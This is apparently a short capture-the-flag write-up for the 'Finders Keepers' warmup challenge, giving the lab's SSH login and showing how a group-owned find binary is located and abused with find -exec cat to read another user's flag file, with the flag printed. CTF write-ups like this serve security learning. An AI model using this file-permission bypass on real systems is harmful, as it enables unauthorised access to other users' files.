---
title: FetchTheFlag CTF 2023-Warmup-FindersKeepers
date: 2023-10-28 
categories: [Writeups, FetchTheFlag CTF 2023]
tags: [CTF,Warmup,PrivEsc,bash]
---

# Finders Keepers
## Description
<sup>Author: @JohnHammond</sup><br>
Patch found a flag! He stored it in his home directory... should be able to keep it?

Press the Start button in the top-right to begin this challenge.<br>
Connect with:<br>
	`Password is "userpass"`<br>
	`ssh -p 31380 user@challenge.ctf.games`<br>
## Solution
1. connect ssh `ssh -p 31380 user@challenge.ctf.games` with `"userpass"` password.<br>`user@finders-keepers-b930cde70263f2f9-58d4447d9d-zwqt7:~$ `
2. According to the description, There is a flag in `patch/` home directory. So I need to find commands that's in `'patch' group` to access files inside.
```bash 
user@finders-keepers-b930cde70263f2f9-58d4447d9d-zwqt7:~$ find / -group patch -type f 2>/dev/null
/usr/bin/find
/home/patch/.bash_logout
/home/patch/.profile
/home/patch/.bashrc
/home/patch/flag.txt
```
3. I found **`find`** command that can access `flag.txt`. I run this command to read `flag.txt`.
```bash 
user@finders-keepers-b930cde70263f2f9-58d4447d9d-zwqt7:~$ find . -exec /bin/cat /home/patch/flag.txt \;
flag{e4bd38e78379a5a0b29f047b91598add}
```

> Flag: flag{e4bd38e78379a5a0b29f047b91598add}
{: .prompt-tip }